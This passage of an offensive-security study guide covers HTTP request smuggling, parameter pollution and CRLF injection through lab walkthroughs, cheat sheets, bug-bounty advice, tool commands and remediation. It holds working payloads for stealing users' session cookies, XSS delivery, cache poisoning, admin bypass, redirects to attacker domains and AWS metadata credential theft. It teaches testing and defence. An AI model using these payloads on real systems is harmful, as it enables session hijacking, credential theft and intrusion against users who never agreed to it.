**Concepts involved:**
- X-Forwarded-For spoofing
- Host header override
- Admin panel bypass via smuggling
- Local privilege (localhost trusted)

---

### Lab 9: Capturing Other Users' Requests

**The Most Dangerous Attack.** An attacker can steal session tokens, credentials, and other sensitive data from real users.

**Concept:**

```
1. Attacker smuggles a partial request as prefix
2. Next user's request is appended to attacker's smuggled prefix
3. Combined request is processed as a POST to attacker-controlled endpoint
4. User's full request (including cookies/tokens) is sent to attacker
```

**Step 1: Find a place to store/reflect text**
A comment, profile bio, or any field that reflects stored input.

**Step 2: Craft the capture payload**

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Cookie: session=YOUR-SESSION-TOKEN
Content-Length: 910
Content-Type: application/x-www-form-urlencoded

csrf=YOUR-CSRF-TOKEN&postId=5&name=attacker&email=a@a.com&comment=
```

**How it works:**
```
The smuggled POST /post/comment has:
Content-Length: 910  ← Much larger than what attacker provides

The next user's request becomes the "comment" field!
Their entire request (with Cookie: session=...) gets appended
and saved as a comment on the post!

Attacker reads the comment → Steals victim's session!
```

**Content-Length calculation:**
```
Make CL large enough to capture the full next request
If too small: captures partial request (maybe enough for cookies)
If too large: back-end waits for more data → timeout
```

---

### Lab 10: Exploiting Reflected XSS via Request Smuggling

**Scenario:** A page reflects a User-Agent header without sanitization.

**Normal XSS:** User-Agent isn't typically attacker-controlled  
**Smuggled XSS:** Use request smuggling to set the User-Agent for another user's request

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
User-Agent: "><script>alert(document.cookie)</script>
Content-Length: 5

x=1
```

**Flow:**
```
1. Attacker smuggles GET /post?postId=5 with XSS in User-Agent
2. Next victim requests any page
3. Back-end prepends smuggled prefix → victim's request becomes body
4. Back-end sends GET /post?postId=5 with XSS User-Agent
5. Response reflects the XSS in User-Agent → executes in context of next user!
```

---

### Lab 11: Turning Self-XSS into Reflected XSS via Smuggling

**Scenario:** A reflected XSS exists in a search parameter, but it only affects the searcher themselves (self-XSS — normally not exploitable).

**With smuggling:** Deliver the XSS to other users.

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Length: 67
Transfer-Encoding: chunked

0

GET /?search="><script>alert(1)</script> HTTP/1.1
Foo: x
```

**Why it becomes exploitable:**
```
1. Attacker plants this smuggled request
2. Next user hits the server
3. Back-end prepends the smuggled GET /?search=XSS prefix
4. Response sent to next user contains the XSS
5. XSS executes in next user's browser
```

---

### Lab 12: Web Cache Poisoning via Request Smuggling

**Scenario:** Combine cache poisoning with smuggling to serve malicious content to all users.

**Concept:**
```
1. Smuggle a redirect/XSS response into the cache
2. Other users requesting the same URL get the poisoned cached response
```

**Attack:**

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: evil-user.net
Content-Length: 10

x=1
```

**If site uses Host header in redirects:**
```
Back-end generates redirect to evil-user.net
If this redirect gets cached → All users get redirected to attacker!
```

**Wormable cache poisoning:**
```
Cache hit for "/" returns attacker's redirect
Every user visiting "/" is redirected to attacker's site
Lasts until cache expires or is flushed
```

---

### Lab 13: Cache Deception via Request Smuggling

**Concept:** Cache a user-specific response (like `/my-account`) and serve it to attackers.

**Attack:**

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Length: 61
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Foo: x
```

**Flow:**
```
1. Attacker smuggles GET /my-account prefix
2. Next user (victim) hits the site
3. Back-end serves victim's /my-account to "foo.js" path
4. Cache caches this response under "foo.js" key
5. Attacker requests "foo.js" → Gets victim's account page with their token!
```

---

### Lab 14: HTTP/2 Request Smuggling via CL.0 Vulnerabilities

**Modern attack.** HTTP/2 inherently doesn't have the CL vs TE problem — but translation to HTTP/1.1 reintroduces it.

**CL.0 Attack:**

```
HTTP/2 to HTTP/1.1 downgrade:

H2 Request:
:method: POST
:path: /
:authority: target.com
content-length: 0      ← Legitimate H2 CL

Front-end (H2) sees: CL=0, no body
Front-end rewrites to H1: Content-Length: 0

But attacker injects a body in H2:
(H2 frames allow body regardless of CL header)

Front-end rewrites H1: Content-Length: 0
But H1 body IS present (from H2 DATA frame)
Back-end reads CL=0 → no body
Remaining body = smuggled prefix!
```

**This is "CL.0" — Content-Length is 0 but body exists.**

---

### Lab 15: Response Queue Poisoning

**Advanced attack.** Attacker receives another user's response entirely.

**Concept:**

```
Normal:  Req1→Resp1, Req2→Resp2, Req3→Resp3

Smuggled: Req1+SmuggleReq2→Resp1
          Resp2→Given to next user's Req2!
          Next user's Req2→Resp3
          Resp3→Given to user of Req3!

All responses are shifted by one → Complete response mixing!
```

**Impact:** Full response body of another user (session tokens, HTML with credentials) is delivered to attacker.

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

username=attacker&password=attacker&
```

Attacker sends this, then immediately sends a normal request. They receive the response meant for the next user.

---

### Lab 16: Bypassing Access Controls via Host Header Smuggling

**Concept:** Use smuggling to inject a different Host header, bypassing virtual hosting restrictions.

**Setup:**
- Target has two virtual hosts: `external.com` and `admin.internal`
- Admin only accessible via `admin.internal` host
- Front-end blocks direct requests to admin

**Attack:**

```http
POST / HTTP/1.1
Host: external.com
Content-Length: 57
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: admin.internal
X-Forwarded-For: 127.0.0.1
```

Back-end processes: `GET / HTTP/1.1` with `Host: admin.internal`  
Routes to admin virtual host → Access granted!

---

## 2.7 All Logical Attacks You Can Do with Request Smuggling

| Attack | Description | Impact |
|--------|-------------|--------|
| **Security Control Bypass** | Front-end WAF/auth bypass | High |
| **Admin Access** | Smuggle to admin endpoints | Critical |
| **User Request Capture** | Steal cookies/tokens from real users | Critical |
| **Response Queue Poisoning** | Receive wrong user's responses | Critical |
| **XSS Delivery** | Turn reflected/self XSS into stored | High |
| **Cache Poisoning** | Poison CDN cache with malicious response | High |
| **Cache Deception** | Cache sensitive user-specific pages | High |
| **SSRF Upgrade** | Use smuggling to reach internal services | High |
| **Redirect Hijacking** | Force redirect to attacker's domain | Medium |
| **Host Header Injection** | Access different virtual hosts | High |
| **Request Amplification** | Use one request to trigger many | Medium |
| **Authentication Bypass** | Login as different user via prefix | Critical |
| **Cross-User Data Leak** | Leak other users' data | High |
| **Rate Limit Bypass** | Smuggle multiple requests as one | Medium |
| **Log Injection** | Inject log entries | Low-Medium |

---

## 2.8 Step-by-Step Testing Methodology

### Phase 1: Initial Reconnaissance

```
Step 1: Identify if a front-end/back-end architecture exists
        - Check response headers for different server signatures
        - Look for Via:, X-Served-By:, X-Cache: headers
        - CDN indicators: CF-Ray (Cloudflare), X-Amz-Cf-Id (CloudFront)

Step 2: Identify supported HTTP versions
        - Does site support HTTP/2? (Browser DevTools → Network → Protocol)
        - Is HTTP/1.1 keep-alive enabled?

Step 3: Check for TE header reflection
        - Send Transfer-Encoding: chunked
        - See if it's reflected/stripped in response
```

### Phase 2: Automated Detection

```bash
# Using HTTP Request Smuggler (Burp extension)
1. Install "HTTP Request Smuggler" from BApp Store
2. Right-click any request
3. Extensions > HTTP Request Smuggler > Smuggle Probe
4. Check results in Alerts tab

# Using smuggler.py (standalone tool)
python3 smuggler.py -u https://target.com

# Using h2csmuggler for HTTP/2
python3 h2csmuggler.py --test https://target.com
```

### Phase 3: Manual Detection

```
Step 1: CL.TE timing probe
        → Send with CL=4, TE=chunked, body="1\r\nA\r\nX"
        → Wait 10 seconds → Delay = CL.TE confirmed

Step 2: TE.CL timing probe
        → Send with CL=6, TE=chunked, body="0\r\n\r\nX"
        → Wait 10 seconds → Delay = TE.CL confirmed

Step 3: Differential response (safer)
        → Send probe twice
        → Different response on 2nd send = vulnerable
```

### Phase 4: Exploitation

```
Step 1: Determine exploit type (CL.TE or TE.CL)
Step 2: Identify target endpoint:
        - /admin
        - /internal
        - /.env
Step 3: Craft exploit payload
Step 4: Test in low-traffic window (to avoid affecting users)
Step 5: Use Turbo Intruder for precise timing
Step 6: Confirm and document
```

### Phase 5: Documentation

```
Required evidence:
✓ HTTP request with smuggling payload
✓ Response showing impact (401→200, captured data, etc.)
✓ Timeline of events
✓ Affected users/data scope
✓ Reproducible PoC steps
```

---

## 2.9 When to Check for HRS

| Signal | Why |
|--------|-----|
| CDN/Load Balancer in place | Classic front-end/back-end split |
| Multiple server headers | Different servers at each layer |
| `Via:` or `X-Forwarded-For:` headers | Proxy in the chain |
| HTTP/2 with HTTP/1.1 backend | Downgrade attack surface |
| Inconsistent responses for same request | Request queue interference |
| WAF in place | Worth trying to bypass |
| Large enterprise application | Multi-tier architecture |
| API gateway + microservices | Multiple servers, multiple parsers |
| Response timing anomalies | Potential queue disruption |

---

## 2.10 HTTP/2 & H2C Smuggling Deep Dive

### HTTP/2 Differences

```
HTTP/1.1:                         HTTP/2:
─────────────────                 ──────────────────────────────
GET / HTTP/1.1                    Binary frames, not text
Host: example.com                 Multiplexed streams
Content-Length: 5                 :method :path :authority used
                                  No Content-Length ambiguity (in theory)
hello
```

### H2.CL Smuggling

When front-end accepts H2 but back-end is H1, the H2→H1 translation can introduce CL:

```
H2 request with body larger than CL header:

:method: POST
:path: /
content-length: 0

GET /admin HTTP/1.1
Host: target.com
```

Front-end sees `content-length: 0` in H2 → translates to H1 with `Content-Length: 0`  
But body (`GET /admin...`) is forwarded anyway!  
Back-end reads CL=0 → treats body as new request prefix

### H2.TE Smuggling

Inject Transfer-Encoding header via H2:

```
:method: POST
:path: /
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: internal-host
```

H2 doesn't use TE (uses DATA frames), but if front-end passes the TE header to H1 backend...  
Back-end sees TE:chunked → processes as chunked → sees `0` terminator early → smuggle!

### H2C Upgrade Attack

```
Client sends HTTP/1.1 Upgrade request:
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA

If server upgrades to h2c (HTTP/2 cleartext):
Attacker can now send multiple requests multiplexed
without front-end seeing them individually
→ Front-end security controls bypassed!
```

---

## 2.11 Tools

| Tool | Description | Usage |
|------|-------------|-------|
| **Burp Suite Pro** | Full smuggling testing | HTTP Request Smuggler extension |
| **Turbo Intruder** | High-speed request sending | Precise timing attacks |
| **HTTP Request Smuggler** | Auto-detect + exploit | BApp Store extension |
| **smuggler.py** | Python standalone tool | `python3 smuggler.py -u URL` |
| **h2csmuggler** | HTTP/2 cleartext smuggling | `python3 h2csmuggler.py` |
| **Param Miner** | Discover hidden params | Burp BApp extension |
| **Reshaper** | Custom request transformation | Burp extension |
| **nuclei** | Template-based detection | `nuclei -t smuggling/ -u URL` |

**Burp Suite Configuration for Smuggling:**
```
1. Proxy → Options → Disable "Update Content-Length"
2. Repeater → Inspector → Disable "Follow redirects"
3. Use HTTP/1 in Repeater (not HTTP/2) for manual testing
4. Turn off "Normalize HTTP/1 requests"
```

---

## 2.12 Remediation

### For Front-End Servers

```nginx
# nginx: Reject requests with both CL and TE
if ($http_transfer_encoding ~ ".+") {
    return 400;
}

# Use HTTP/2 end-to-end
# Don't downgrade to HTTP/1.1 if avoidable
```

### For Back-End Servers

```apache
# Apache: Only accept one body-length header
# Reject if both CL and TE present
```

### General Fixes

```
✓ Use HTTP/2 end-to-end (no H1 back-end)
✓ Use CL.0 (Content-Length: 0) for GET requests
✓ Reject requests with both CL and TE headers
✓ Enable connection: close between proxies (no keep-alive)
✓ Use a WAF aware of smuggling (some Cloudflare rules)
✓ Normalize requests at the front-end before forwarding
✓ Enable strict HTTP parsing mode
✓ Update to modern servers (patched versions)
```

---

# PART 3: ADVANCED CHAINING & REAL-WORLD TECHNIQUES

---

## 3.1 Chaining HPP + HRS

```
Attack chain:
1. Identify HPP in a parameter (e.g., redirect_url)
2. Identify HRS in the same endpoint
3. Smuggle a request with polluted parameters
4. Result: WAF-bypassed + polluted request reaches backend

Example:
POST / HTTP/1.1
Content-Length: 120
Transfer-Encoding: chunked

0

POST /redirect HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

redirect_url=https://safe.com&redirect_url=https://attacker.com
```

## 3.2 HRS → SSRF

```
Smuggle requests to internal services:

Smuggled:
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254

→ AWS metadata endpoint → IAM credentials!
```

## 3.3 HRS → XSS → Account Takeover

```
Chain:
1. Find HRS (CL.TE)
2. Smuggle user's request to reflected XSS endpoint
3. XSS runs in victim's browser
4. XSS steals session cookie
5. Attacker uses cookie → full account takeover
```

## 3.4 HPP → OAuth Bypass

```
OAuth flow: /callback?code=LEGIT&state=SAFE

Polluted: /callback?code=ATTACKER&code=LEGIT&state=SAFE
         ^^^^^^^^^^^^^^^^^^^^^^^^^
         If server reads FIRST code: uses attacker's code
         → Account takeover if attacker controls that OAuth code
```

## 3.5 Cache Poisoning Chain

```
HRS → Cache Poison → Persistent XSS for ALL users

1. Smuggle request that makes server return XSS response for /
2. CDN caches the XSS response for /
3. All users visiting / get XSS
4. Wormable attack!
```

---

# PART 4: BUG BOUNTY STRATEGY

---

## 4.1 Where to Look

```
High-value targets for HPP:
✓ /payment, /checkout, /order
✓ /login, /signup, /verify
✓ /api/v1/user, /api/v1/role
✓ /oauth/callback, /auth/verify
✓ /search, /filter (WAF bypass)
✓ /send, /email, /notify

High-value targets for HRS:
✓ CDN-fronted applications
✓ API gateways
✓ Applications with load balancers
✓ Microservices architectures
✓ WAF-protected applications
```

## 4.2 Reporting HRS

HRS reports should include:

```markdown
## Summary
HTTP Request Smuggling (CL.TE) allowing bypass of front-end
security controls and access to restricted admin functionality.

## Steps to Reproduce
1. Send the following HTTP request to [endpoint]:
   [Full HTTP request]
2. Observe [specific impact]
3. Send second request to confirm [differential response]

## Proof of Concept
[Screenshots or video]

## Impact
- Bypass WAF/front-end security controls
- Access admin functionality as unauthenticated user
- Ability to steal other users' sessions

## CVSS Score
9.8 CRITICAL
AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

## Remediation
[Specific fix recommendations]
```

## 4.3 Severity Classification

| Vulnerability | Typical Bounty Range |
|--------------|---------------------|
| HRS + Admin Bypass | $3,000 – $50,000+ |
| HRS + User Data Capture | $5,000 – $30,000 |
| HRS + Cache Poisoning | $2,000 – $15,000 |
| HRS + XSS Delivery | $1,500 – $10,000 |
| HPP + Authentication Bypass | $1,000 – $20,000 |
| HPP + Price Manipulation | $500 – $10,000 |
| HPP + WAF Bypass | $500 – $5,000 |
| HPP (Informational) | $0 – $500 |

---

# PART 5: QUICK REFERENCE CHEAT SHEETS

---

## 5.1 HPP Cheat Sheet

```
═══════════════════════════════════════════════════════════
                   HPP QUICK REFERENCE
═══════════════════════════════════════════════════════════

DUPLICATE PARAMETER BEHAVIOR:
  PHP / Ruby / Node   → LAST value wins
  ASP.NET / IIS       → ALL values (comma-joined)
  Java / Python / ASP → FIRST value wins

BASIC PAYLOADS:
  ?param=legitimate&param=malicious      (duplicate)
  ?param=malicious&param=legitimate      (reversed order)
  ?param[]=val1&param[]=val2             (array notation)
  ?param=val1%26param=val2              (encoded &)

WAF BYPASS:
  ?search=safe&search=<script>           (pollution bypass)
  ?q=<scr&q=ipt>alert(1)</script>        (split payload)

LOGIC ATTACKS:
  ?role=user&role=admin                  (privilege escalation)
  ?price=100&price=1                     (price manipulation)
  ?verified=false&verified=true          (state bypass)
  ?from=victim&to=attacker&from=attacker (transfer)
  ?code=LEGIT&code=ATTACKER             (OAuth bypass)

TESTING STEPS:
  1. Baseline request
  2. Add duplicate parameter
  3. Reverse parameter order
  4. Compare responses
  5. Document impact
═══════════════════════════════════════════════════════════
```

## 5.2 HRS Cheat Sheet

```
═══════════════════════════════════════════════════════════
              HTTP REQUEST SMUGGLING QUICK REFERENCE
═══════════════════════════════════════════════════════════

TYPES:
  CL.TE  → Front: Content-Length | Back: Transfer-Encoding
  TE.CL  → Front: Transfer-Encoding | Back: Content-Length
  TE.TE  → Both TE, one obfuscated to ignore TE

CL.TE TEMPLATE:
  POST / HTTP/1.1
  Content-Length: [LEN]
  Transfer-Encoding: chunked

  0

  [SMUGGLED REQUEST]

TE.CL TEMPLATE:
  POST / HTTP/1.1
  Content-Length: 4
  Transfer-Encoding: chunked

  [HEX_SIZE]
  [SMUGGLED REQUEST]
  0


TE OBFUSCATION:
  Transfer-Encoding: xchunked
  Transfer-Encoding: x-chunked
  Transfer-Encoding: chunked, dav
  Transfer-Encoding:chunked        (no space)
   Transfer-Encoding: chunked      (leading space)
  Transfer-Encoding: CHUNKED

TIMING PROBES:
  CL.TE: CL=4, TE=chunked, body ends with invalid chunk → timeout
  TE.CL: CL=6, TE=chunked, body="0\r\n\r\nX" → timeout

EXPLOITATION TARGETS:
  /admin, /internal, /.env
  Login endpoints (for user capture)
  Search (for XSS delivery)
  Cache endpoints (for poisoning)

TOOLS:
  Burp HTTP Request Smuggler extension
  Turbo Intruder (timing-precise)
  smuggler.py
  h2csmuggler.py (HTTP/2)
═══════════════════════════════════════════════════════════
```

## 5.3 Methodology Flowchart

```
START
  │
  ▼
Identify target architecture
  │
  ├─► Single server? → HPP testing only
  │
  └─► Front-end + Back-end? → Both HPP & HRS testing
            │
            ▼
      Test for HRS type:
            │
            ├─► Timing probe (CL.TE)
            │       │
            │       └─► Delayed? → CL.TE confirmed
            │
            ├─► Timing probe (TE.CL)
            │       │
            │       └─► Delayed? → TE.CL confirmed
            │
            └─► Try TE obfuscations → TE.TE?
                        │
                        ▼
               HTTP/2 downgrade? → H2.CL / H2.TE?
                        │
                        ▼
            Confirm with differential response
                        │
                        ▼
                 Exploit & Document
                        │
                        ▼
                    REPORT!
```

---

## 5.4 Recommended Resources

### Books
| Book | Author | Coverage |
|------|--------|----------|
| The Web Application Hacker's Handbook 2nd Ed. | Stuttard & Pinto | HPP fundamentals |
| Real-World Bug Hunting | Peter Yaworski | HPP case studies |
| Bug Bounty Bootcamp | Vickie Li | HPP methodology |
| The Tangled Web | Michal Zalewski | HTTP internals |

### Online Resources
- **PortSwigger Web Security Academy** — best free HRS labs
- **James Kettle's research** — "HTTP Desync Attacks" (2019 DEF CON)
- **OWASP Testing Guide** — HPP testing methodology
- **HackerOne Hacktivity** — Real HPP/HRS reports
- **PortSwigger Research Blog** — Latest smuggling research

### YouTube / Talks
- DEF CON 27: "HTTP Desync Attacks" — James Kettle
- OWASP AppSec 2009: "HTTP Parameter Pollution" — Di Paola & Carettoni
- NahamCon 2022: "Request Smuggling in the Wild"

---

---

# PART 6: AUTOMATION TECHNIQUES, SCRIPTS & TOOL DEEP DIVES

> Complete automation reference — every tool, every command, every script.
> Also covers CRLF Injection in full depth with theory, indentation rules, and attacks.

---

## 6.0 CRLF INJECTION — Complete Theory

Before automating anything, you MUST understand CRLF — it is the foundation
of HTTP Request Smuggling, header injection, log injection, and response splitting.

### What Are CR and LF?

```
CR  = Carriage Return = \r = ASCII 13 = 0x0D
LF  = Line Feed       = \n = ASCII 10 = 0x0A
CRLF = \r\n = the standard HTTP line terminator
```

Think of it like a typewriter:
```
CR  → moves the print head back to column 1   (carriage return)
LF  → advances the paper one line down        (line feed)
```

### How HTTP Uses CRLF

Every single line in an HTTP request/response is terminated by \r\n.
The header section ends with a BLANK LINE = \r\n\r\n (two consecutive CRLFs).

```
RAW BYTES of a complete HTTP request:

GET /index.html HTTP/1.1\r\n          ← Request line
Host: example.com\r\n                  ← Header 1
User-Agent: Mozilla/5.0\r\n           ← Header 2
Accept: text/html\r\n                  ← Header 3
Connection: keep-alive\r\n             ← Header 4
\r\n                                   ← BLANK LINE = end of headers
                                       ← Body starts here (empty for GET)
```

### CRLF Injection Definition

CRLF Injection occurs when an attacker injects \r\n characters into user-
controlled input that gets reflected into an HTTP header or response.

```
VULNERABLE server code (PHP):

<?php
$lang = $_GET['lang'];
header("Content-Language: " . $lang);
?>

NORMAL request:
GET /?lang=en HTTP/1.1
→ Response header: Content-Language: en

INJECTED request:
GET /?lang=en%0d%0aSet-Cookie:%20admin=true HTTP/1.1
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
         %0d = \r (CR), %0a = \n (LF)

→ Response headers become:
Content-Language: en\r\n
Set-Cookie: admin=true\r\n       ← INJECTED HEADER!
```

### URL Encoding Reference for CRLF

```
Character   ASCII   URL Encoded   Double Encoded
─────────────────────────────────────────────────
\r  (CR)    0x0D    %0D           %250D
\n  (LF)    0x0A    %0A           %250A
\r\n (CRLF) —       %0D%0A        %250D%250A

Alternative encodings (WAF bypass):
  %0d%0a          standard
  %0D%0A          uppercase
  %0d%0A          mixed case
  %0a             LF only (works on some servers)
  \r\n            literal (in some contexts)
  %E5%98%8A%E5%98%8D  Unicode trick (%e5%98%8a = \n lookalike)
  %u000d%u000a    JavaScript unicode escape
  \u000d\u000a    Java/JSON unicode escape
  \x0d\x0a        hex escape
```

### HTTP Header Indentation Rules (Critical for CRLF + Smuggling)

This is what most guides skip. You MUST understand HTTP header formatting rules.

```
RULE 1: Each header is on its own line, terminated by \r\n
────────────────────────────────────────────────────────────
Content-Type: application/json\r\n
Content-Length: 42\r\n
Authorization: Bearer token123\r\n

RULE 2: Header name and value are separated by ": " (colon + space)
────────────────────────────────────────────────────────────
Correct:   Content-Type: text/html\r\n
Incorrect: Content-Type:text/html\r\n   ← no space (some servers reject)
Incorrect: Content-Type : text/html\r\n ← space before colon (invalid)

RULE 3: Header folding (obsolete but supported by some servers!)
────────────────────────────────────────────────────────────
A header value can span multiple lines if continuation lines
start with SP (space) or HT (tab):

Transfer-Encoding: chunked\r\n    ← main line
 identity\r\n                      ← continuation (leading SPACE!)

Some servers see:  Transfer-Encoding: chunked identity
Some servers see:  Transfer-Encoding: chunked       ← stops at first value
                   (and a new header "identity")

THIS IS HOW TE.TE SMUGGLING WORKS!

RULE 4: The blank line (double CRLF) separates headers from body
────────────────────────────────────────────────────────────
...last-header: value\r\n
\r\n                           ← This blank line = \r\n\r\n total
[body starts here]

RULE 5: Chunked body encoding indentation
────────────────────────────────────────────────────────────
Each chunk has:
  [hex-size]\r\n
  [chunk-data]\r\n
  [next hex-size]\r\n
  [next chunk-data]\r\n
  0\r\n                 ← terminal chunk (size = 0)
  \r\n                  ← blank line after terminal chunk

Example body "Hello World" in chunked:
  b\r\n                 ← 0xb = 11 = len("Hello World")
  Hello World\r\n
  0\r\n
  \r\n
```

### CRLF in Chunked Encoding — Indentation Explained

This is the exact byte-level layout that makes CL.TE smuggling work:

```
Smuggling request body (annotated):

BYTE SEQUENCE          MEANING
───────────────────────────────────────────────────────────
"0"                    chunk size = 0 (decimal)
"\r\n"                 end of chunk-size line
"\r\n"                 blank line after terminal chunk
"G"                    ← SMUGGLED: start of "GET /admin..."
"E"
"T"
" "
"/"
...

In hex:
30 0D 0A 0D 0A 47 45 54 20 2F ...
│  │     │     │
│  └─CR  └─LF  └─Start of smuggled request
└─ ASCII '0' (chunk terminator)

Why "0\r\n\r\n" and NOT just "0\r\n"?
→ Chunked encoding REQUIRES a blank line after the terminal "0" chunk.
  Without it, many servers will reject or hang.
  The blank line = second \r\n AFTER the "0\r\n".
```

### CRLF Injection Attack Types

**Type 1: HTTP Response Splitting**

```
Payload: /%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a...

Attack injects a COMPLETE second HTTP response into the first.
Browser sees two responses → second can be attacker-controlled content.

Decoded:
\r\n
Content-Length: 0\r\n
\r\n
HTTP/1.1 200 OK\r\n        ← Second fake response!
Content-Type: text/html\r\n
\r\n
<html>attacker content</html>
```

**Type 2: Header Injection**

```
Payload: ?redirect=https://safe.com%0d%0aSet-Cookie:%20admin=1

Server generates:
Location: https://safe.com\r\n
Set-Cookie: admin=1\r\n          ← Injected!
```

**Type 3: Log Injection**

```
Request: GET /%0d%0a[INJECTED LOG LINE] HTTP/1.1

Server log becomes:
127.0.0.1 - GET /
[INJECTED LOG LINE] HTTP/1.1

Attacker can forge log entries, hide their tracks,
or inject fake entries to frame others.
```

**Type 4: XSS via CRLF**

```
Payload: ?lang=en%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>

Response becomes:
HTTP/1.1 200 OK
Content-Language: en
Content-Type: text/html          ← Injected! Changes content type

                                  ← Injected blank line (end of headers)
<script>alert(1)</script>         ← Injected body with XSS!
```

**Type 5: CRLF → SSRF**

```
Payload in Host header:
Host: legitimate.com%0d%0aHost:%20internal.corp.com

Some servers split on \r\n in Host and route to second host:
→ Internal SSRF!
```

**Type 6: CRLF in Transfer-Encoding (TE.TE Core)**

```
This is how TE.TE header folding works at byte level:

Transfer-Encoding:\x20chunked\r\n
\x20identity\r\n                   ← \x20 = space = header folding continuation

Front-end sees:  Transfer-Encoding: chunked identity → uses chunked
Back-end sees:   Transfer-Encoding: chunked          → uses chunked
                 (then sees " identity" as new header → ignores TE)

Result: Both process differently → TE.TE desync!
```

---

## 6.1 Tool Ecosystem Overview

```
═══════════════════════════════════════════════════════════════════════
                    COMPLETE TOOL ECOSYSTEM
═══════════════════════════════════════════════════════════════════════

  RECON                   DETECTION               EXPLOITATION
  ─────                   ─────────               ────────────
  Arjun                   smuggler.py             Turbo Intruder
  Param Miner             HTTP Req Smuggler       hrs_exploit_gen.py
  ffuf                    nuclei templates        Burp Repeater (manual)
  gau / waybackurls       h2csmuggler             desync scripts
  katana                  hrs_detector.py         Intruder clusterbomb
  hakrawler               timing probes           caido workflows

  CRLF SPECIFIC           SUPPORTING              PIPELINE
  ─────────────           ──────────              ────────
  CRLFuzz                 Burp Suite Pro          bash orchestrator
  crlfuzz Go tool         caido                   Python async engine
  custom curl probes      mitmproxy               Docker test labs
  OWASP ZAP active        curl / httpx            GitHub Actions CI
═══════════════════════════════════════════════════════════════════════
```

---

## 6.2 Environment Setup — Complete

```bash
#!/bin/bash
# setup_complete.sh — Full environment: HPP + HRS + CRLF tools
set -e

echo "[*] Setting up complete HTTP security testing environment..."

# ── System packages ────────────────────────────────────────────────
sudo apt-get update -y
sudo apt-get install -y \
    python3 python3-pip python3-venv \
    golang-go git curl wget jq \
    libssl-dev build-essential netcat-openbsd

# ── Go environment ─────────────────────────────────────────────────
export GOPATH="$HOME/go"
export PATH="$PATH:$GOPATH/bin"
echo 'export GOPATH="$HOME/go"' >> ~/.bashrc
echo 'export PATH="$PATH:$GOPATH/bin"' >> ~/.bashrc

# ── Go tools ──────────────────────────────────────────────────────
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/ffuf/ffuf/v2@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/lc/gau/v2/cmd/gau@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/tomnomnom/qsreplace@latest
# CRLFuzz — dedicated CRLF injection scanner
go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest

echo "[+] Go tools installed"

# ── Python venv + packages ─────────────────────────────────────────
python3 -m venv ~/sec-venv
source ~/sec-venv/bin/activate

pip install --upgrade pip
pip install requests httpx[http2] h2 aiohttp colorama \
            arjun urllib3 python-dotenv

# ── Clone tool repos ───────────────────────────────────────────────
mkdir -p ~/sec-tools
cd ~/sec-tools

# smuggler.py (HRS)
[ -d smuggler ] || git clone https://github.com/defparam/smuggler.git

# h2csmuggler (HTTP/2 HRS)
[ -d h2csmuggler ] || git clone https://github.com/BishopFox/h2csmuggler.git
pip install h2 hyperframe hpack

# nuclei templates
nuclei -update-templates

echo "[+] All tools installed"
echo "[+] Activate venv: source ~/sec-venv/bin/activate"
```

---

## 6.3 CRLFuzz — Complete Guide

CRLFuzz is the dedicated Go tool for CRLF injection scanning.

### Installation

```bash
go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest
# verify
crlfuzz --version
```

### Full Usage Reference

```bash
# ── Basic scan (single URL) ────────────────────────────────────────
crlfuzz -u "https://target.com/page?param=VALUE"

# ── Scan with custom path list ────────────────────────────────────
crlfuzz -u "https://target.com" \
        -w /path/to/paths.txt

# ── Scan multiple URLs from file ──────────────────────────────────
crlfuzz -l urls.txt

# ── Pipe from other tools ─────────────────────────────────────────
cat urls.txt | crlfuzz -u -

# ── Concurrency (default 25) ──────────────────────────────────────
crlfuzz -u "https://target.com/FUZZ" -c 50

# ── Silent mode (only findings) ───────────────────────────────────
crlfuzz -u "https://target.com/FUZZ" -s

# ── With proxy (route through Burp) ──────────────────────────────
crlfuzz -u "https://target.com/FUZZ" \
        -x http://127.0.0.1:8080

# ── Custom headers (authenticated) ───────────────────────────────
crlfuzz -u "https://target.com/FUZZ" \
        -H "Cookie: session=abc123" \
        -H "Authorization: Bearer TOKEN"

# ── Custom method ─────────────────────────────────────────────────
crlfuzz -u "https://target.com/FUZZ" -X POST

# ── Output results to file ────────────────────────────────────────
crlfuzz -u "https://target.com/FUZZ" -o crlf_results.txt

# ── Verbose (show all requests) ───────────────────────────────────
crlfuzz -u "https://target.com/FUZZ" -v

# ── Skip SSL verification ─────────────────────────────────────────
crlfuzz -u "https://target.com/FUZZ" -k

